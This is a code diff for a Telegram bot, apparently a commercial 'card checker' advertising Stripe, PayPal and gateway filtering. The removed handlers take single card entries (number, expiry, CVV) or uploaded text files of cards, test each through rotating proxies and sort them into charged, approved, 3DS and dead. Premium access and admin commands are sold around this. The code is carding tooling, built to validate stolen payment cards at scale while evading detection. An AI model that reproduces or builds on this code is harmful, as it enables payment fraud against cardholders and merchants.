+    print("[+] 👑PORIOT_KE👑 Dual-Engine Bot (v15 - Stripe, PayPal & Gateway Filter) ONLINE...")
+    app.run_polling()
 
-@bot.on(events.NewMessage(pattern='/help'))
-async def help_cmd(e):
-    uid = e.sender_id
-    is_prem = is_admin(uid) or is_premium(uid)
-    await e.reply(f"""
-╔════════════════════════════╗
-║   📚 Help & Commands       ║
-╠════════════════════════════╣
-║  {'✅ Premium Access' if is_prem else '🔑 Get Premium: /redeem [code]'} ║
-╠════════════════════════════╣
-║  ⚡ Single Check:          ║
-║  /sh card|mm|yy|cvv        ║
-╠════════════════════════════╣
-║  📂 Mass Check:            ║
-║  Send .txt file directly   ║
-╠════════════════════════════╣
-║  🔌 Proxy:                 ║
-║  /setproxy ip:port         ║
-║  /clearuserproxy           ║
-╠════════════════════════════╣
-║  🔑 Premium:               ║
-║  /redeem [code]            ║
-╠════════════════════════════╣
-║  👑 Admin:                 ║
-║  /mc [count]               ║
-║  /addpremium id            ║
-║  /addproxy ip:port         ║
-║  /clearproxy               ║
-╚════════════════════════════╝
-{DEV_LINE}""", parse_mode='html')
-
-@bot.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.txt')))
-async def txt(e):
-    try:
-        uid = e.sender_id
-        if not is_admin(uid) and not is_premium(uid):
-            await e.reply("❌ Premium Required!\nUse /redeem [code]")
-            return
-        proxies = get_proxies_for_user(uid)
-        if not proxies:
-            await e.reply("❌ No proxy configured!\nUse: /setproxy ip:port")
-            return
-        fp = await e.message.download_media()
-        async with aiofiles.open(fp, 'r') as f:
-            content = await f.read()
-        os.remove(fp)
-        cards = extract_cc(content)
-        if not cards:
-            await e.reply("❌ No valid cards found!")
-            return
-        m = await e.reply(f"🔥 Found {len(cards)} cards. Starting check...")
-        r = {'charged': [], 'approved': [], 'tds': [], 'dead': [], 'total': len(cards), 'start': time.time()}
-        for i, card in enumerate(cards):
-            res = await check_retry(card, proxies)
-            status = res.get('status', '')
-            if 'Charged' in status:
-                r['charged'].append(res)
-            elif 'Approved' in status:
-                r['approved'].append(res)
-            elif '3DS' in status:
-                r['tds'].append(res)
-            else:
-                r['dead'].append(res)
-            if (i + 1) % 5 == 0:
-                await m.edit(f"""
-🔥 Progress: {progress(i+1, len(cards))}
-💎 Charged: {len(r['charged'])}
-✅ Approved: {len(r['approved'])}
-⚠️ 3DS: {len(r['tds'])}
-❌ Dead: {len(r['dead'])}""")
-        
-        await e.reply(f"""
-╔════════════════════════════╗
-║   ✅ Mass Check Complete!  ║
-╠════════════════════════════╣
-║  📋 Total: {len(cards)}              ║
-║  💎 Charged: {len(r['charged'])}           ║
-║  ✅ Approved: {len(r['approved'])}          ║
-║  ⚠️ 3DS: {len(r['tds'])}              ║
-║  ❌ Dead: {len(r['dead'])}             ║
-║  ⏱️ Time: {int(time.time() - r['start'])}s        ║
-╚════════════════════════════╝
-{DEV_LINE}""", parse_mode='html')
-    except Exception as ex:
-        print(f"TXT error: {ex}")
-        await e.reply(f"Error: {ex}")
-
-print("✅ Bot running! Send /start")
-bot.run_until_disconnected()
+if __name__ == "__main__":
+    main()
